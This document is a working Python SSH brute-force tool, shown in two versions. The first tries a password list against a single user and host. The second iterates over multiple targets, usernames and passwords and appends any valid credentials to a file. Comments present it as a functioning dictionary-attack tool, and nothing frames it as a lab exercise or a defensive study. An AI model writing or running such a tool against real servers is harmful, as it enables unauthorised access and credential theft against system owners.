#!/usr/bin/python
import paramiko
import socket
def check_connection(targetConnection, usernameConnection, passwordConnection):
    # init
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=targetConnection, username=usernameConnection, password=passwordConnection, timeout=2)
    except socket.timeout:
        # Can't access target
        print(f"Host: {targetConnection} is unreachable - is SSH enabled?.")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for {usernameConnection}:{passwordConnection}")
        return False
    except paramiko.SSHException:
        print(f"Exception occured")
        return False
    else:
        # connection established
        print(f"Valid Credentials:\n\tHOSTNAME: {targetConnection}\n\tUSERNAME: {usernameConnection}\n\tPASSWORD: {passwordConnection}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Dictionary Attack for SSH servers")
    parser.add_argument("target", help="Target machine")
    parser.add_argument("-p", "--passwords", help="Password file")
    parser.add_argument("-u", "--username", help="SSH Username")
    # parse args
    args = parser.parse_args()
    target = args.target
    passes = args.passwords
    user = args.username
    # read file(s)
    passes = open(passes).read().splitlines()
    # attack
    for password in passes:
        if check_connection(target, user, password):
            # if credentials are valid, save them
            open("ValidCreds.txt", "w").write(f"\nUsername: {user}@{target}\nPassword: {password}\n\n")
            break

            #This code provides a functioning SSH brute-forcing tool.

#!/usr/bin/python
import paramiko
import socket

def check_connection(targetConnection, usernameConnection, passwordConnection):
    # init
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=targetConnection, username=usernameConnection, password=passwordConnection, timeout=2)
    except socket.timeout:
        # Can't access target
        print(f"Host: {targetConnection} is unreachable - is SSH enabled?.")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for {usernameConnection}:{passwordConnection}")
        return False
    except paramiko.SSHException:
        print(f"Exception occurred")
        return False
    else:
        # connection established
        print(f"Valid Credentials:\n\tHOSTNAME: {targetConnection}\n\tUSERNAME: {usernameConnection}\n\tPASSWORD: {passwordConnection}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Dictionary Attack for SSH servers")
    parser.add_argument("targets", nargs='+', help="List of target machines")
    parser.add_argument("-p", "--passwords", help="Password file")
    parser.add_argument("-u", "--usernames", help="Username file")
    # parse args
    args = parser.parse_args()
    targets = args.targets
    passes = args.passwords
    users = args.usernames

    # read username and target files
    users = open(users).read().splitlines()
    passes = open(passes).read().splitlines()

    # attack
    for target in targets:
        for user in users:
            for password in passes:
                if check_connection(target, user, password):
                    # if credentials are valid, save them
                    with open("ValidCreds.txt", "a") as f:
                        f.write(f"\nUsername: {user}@{target}\nPassword: {password}\n\n")
                    break

#This code will accept a list of target machines and a list of usernames as input arguments, read the username and password files, and then attempt a dictionary attack against all possible combinations of targets, usernames, and passwords. If valid credentials are found, they will be saved in the "ValidCreds.txt" file.
